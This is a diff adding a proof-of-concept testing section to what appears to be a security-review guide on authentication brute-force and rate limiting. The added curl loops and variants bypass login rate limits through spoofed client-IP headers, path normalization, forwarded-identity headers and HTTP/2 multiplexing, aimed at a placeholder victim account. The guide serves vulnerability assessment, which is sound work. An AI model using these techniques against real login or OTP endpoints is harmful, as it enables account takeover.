@@ -339,6 +339,46 @@ rg -n "user_not_found|email_not_found|no such user|account does not exist" .
 
 **Heuristic**: login/OTP/reset handler + zero grep hits for limiter/lockout/backoff in repo scope → **LIKELY** (`brute_force`); confirm handler processes unlimited attempts in application code (see FALSE POSITIVE rules for infra/WAF caveat).
 
+## Dynamic Test / PoC
+
+Establish baseline: send N+5 identical auth attempts from one IP — expect `429`/lockout/CAPTCHA after N. If all return `401`/`200` without throttle, retry with bypass variants below.
+
+**Client-IP header rotation** (when limit is IP-based behind a proxy):
+
+```bash
+for i in $(seq 1 50); do
+  IP="$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1))"
+  curl -s -o /dev/null -w "%{http_code} " -X POST https://app.example/api/login \
+    -H "X-Forwarded-For: $IP" -H "X-Real-IP: $IP" -H "X-Client-IP: $IP" \
+    -H "Content-Type: application/json" \
+    -d '{"email":"victim@example.com","password":"guess"}'
+done
+```
+
+**URL / path normalization** — same body, alternate paths (new cache/routing keys):
+
+```bash
+curl -X POST https://app.example/API/LOGIN -d '{"email":"victim@example.com","password":"x"}'
+curl -X POST https://app.example/api/login/ -d '...'
+curl -X POST "https://app.example/api/login?_=1730000000" -d '...'
+curl -X POST https://app.example//api//login -d '...'
+```
+
+**Header-based identity** — if the app trusts forwarded identity headers:
+
+```bash
+curl -X POST https://app.example/api/login \
+  -H "X-Forwarded-For: 127.0.0.1" \
+  -H "X-Original-URL: /api/login" \
+  -d '{"email":"victim@example.com","password":"x"}'
+```
+
+**Method / case variation** — `GET` vs `POST`, or mixed-case path segments, when middleware keys differ from the handler.
+
+**HTTP/2 multiplexing** — many login attempts on one warmed connection (e.g. `curl --http2-prior-knowledge` in a loop) to evade per-connection counters.
+
+**Confirm**: count attempts that reach credential verification beyond the advertised limit; OTP endpoints with 4–6 digit codes and no lockout after baseline N are especially high signal.
+
 ## Related References
 
 - `references/authentication_jwt.md` — MFA/OTP rate limits, recovery tokens, uniform reset responses, session revocation on password change, `skipMfa`/`bypassMfa` detection; lockout/backoff and reset rate-limit patterns cross-link here.
